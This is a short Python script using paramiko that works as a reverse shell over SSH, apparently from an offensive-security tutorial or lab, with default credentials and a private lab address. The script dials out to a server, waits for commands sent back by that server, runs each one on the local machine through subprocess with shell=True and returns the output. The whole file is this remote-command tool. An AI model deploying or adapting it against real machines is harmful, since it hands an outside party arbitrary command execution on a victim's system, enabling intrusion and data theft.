import paramiko
import shlex
import subprocess
import getpass


def ssh_command(hostname, server_port, user, passwd, initial_command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=hostname, port=int(server_port), username=user, password=passwd
        )
        ssh_session = client.get_transport().open_session()

        if ssh_session.active:
            ssh_session.send(initial_command)
            print(ssh_session.recv(1024).decode())

            while True:
                command = ssh_session.recv(1024)
                try:
                    cmd = command.decode()
                    if cmd.strip() == "exit":
                        break

                    cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                    ssh_session.send(cmd_output or b"okey")
                except subprocess.CalledProcessError as e:
                    print("CalledProcessError")
                    ssh_session.send(str(e).encode())
                except Exception as e:
                    print("Exception")
                    ssh_session.send(str(e).encode())

    except paramiko.SSHException as sshException:
        print(f"Error while establishing SSH connection: {sshException}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()


if __name__ == "__main__":
    username = input("Username: ").strip() or "tim"
    password = getpass.getpass() or "pass"
    hostname = input("Hostname: ").strip() or "192.168.58.1"
    server_port = input("Server Port or <CR>: ").strip() or "2222"
    initial_command = "ClientConnected"

    ssh_command(hostname, server_port, username, password, initial_command)
